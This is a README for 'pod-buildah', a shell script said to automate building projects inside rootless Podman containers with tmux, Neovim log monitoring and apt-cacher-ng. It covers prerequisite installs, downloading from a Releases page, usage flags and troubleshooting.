# 🚀 pod-buildah - Automate Container Builds with Ease

[![Download pod-buildah](https://img.shields.io/badge/Download-pod--buildah-brightgreen)](https://github.com/joanncognizant380/pod-buildah/releases)

## 📄 Description

pod-buildah is a simple shell script designed to create rootless Podman containers. This tool helps you automate the compilation and building of GitHub projects, applications, kernels, or any other tasks. With pod-buildah, you gain full integration with tmux, log monitoring using Neovim, and seamless support for apt-cacher-ng across all containers.

## 🚀 Getting Started

These instructions will help you download and run pod-buildah on your system. You do not need to be a programmer to follow these steps.

### 🛠️ Prerequisites

Before you start, ensure you have the following:

1. **Operating System**: pod-buildah works best on Debian-based distributions, including Ubuntu.
2. **Podman**: This tool requires Podman to create and manage containers. You can install it using:

   ```bash
   sudo apt-get update
   sudo apt-get install podman
   ```

3. **tmux**: Install tmux for terminal multiplexing by running:

   ```bash
   sudo apt-get install tmux
   ```
   
4. **Neovim**: You also need Neovim for log monitoring:

   ```bash
   sudo apt-get install neovim
   ```

5. **apt-cacher-ng**: Make sure apt-cacher-ng is installed for caching dependencies:

   ```bash
   sudo apt-get install apt-cacher-ng
   ```

## 📥 Download & Install

To get started with pod-buildah, visit the [Releases page](https://github.com/joanncognizant380/pod-buildah/releases) to download the latest version. 

1. Click on the link to go to the Releases page.

2. Find the version you want and download the file suitable for your system.

3. Once downloaded, navigate to the location of the file in your terminal.

4. Make the script executable by running:

   ```bash
   chmod +x pod-buildah.sh
   ```

5. Run the script using:

   ```bash
   ./pod-buildah.sh
   ```

## ⚙️ Usage Instructions

After installation, you can use pod-buildah to create a new container for your projects. Simply follow these steps:

1. Open your terminal.
2. Inside your terminal, type the command to create a new container:

   ```bash
   ./pod-buildah.sh <your_project_repo_url>
   ```

3. The script will handle the rest. It will create the container and begin compiling your project.

4. You can monitor the logs in real-time using Neovim by adding the `-l` flag:

   ```bash
   ./pod-buildah.sh -l <your_project_repo_url>
   ```

5. You can also use tmux to run multiple commands at once and monitor your builds.

## 🎯 Key Features

- **Rootless Containers**: Easily run containers without needing root access.
- **Integration with tmux**: Utilize tmux for enhanced terminal management.
- **Log Monitoring**: Real-time log access with Neovim integration.
- **Caching Support**: Automatically use apt-cacher-ng for faster installations.
- **Flexible**: Suitable for various tasks beyond building, like running applications or kernel tasks.

## 🛠️ Troubleshooting

If you run into issues during download or installation, consider the following solutions:

1. **Permission Denied**: If you receive a permission error, ensure the script is executable by running `chmod +x pod-buildah.sh`.
2. **Podman Not Found**: Make sure Podman is installed correctly. You can recheck using `podman --version`.
3. **Dependency Errors**: Ensure all prerequisites are installed; rerun the installation commands if needed.

## 🗣️ Support

For additional help, feel free to reach out. Open an issue on GitHub, and we’ll get back to you as soon as possible.

## 🔗 Links

- [Releases Page](https://github.com/joanncognizant380/pod-buildah/releases)
- [GitHub Repository](https://github.com/joanncognizant380/pod-buildah)

## 📜 License

This project is licensed under the MIT License. See the LICENSE file for details.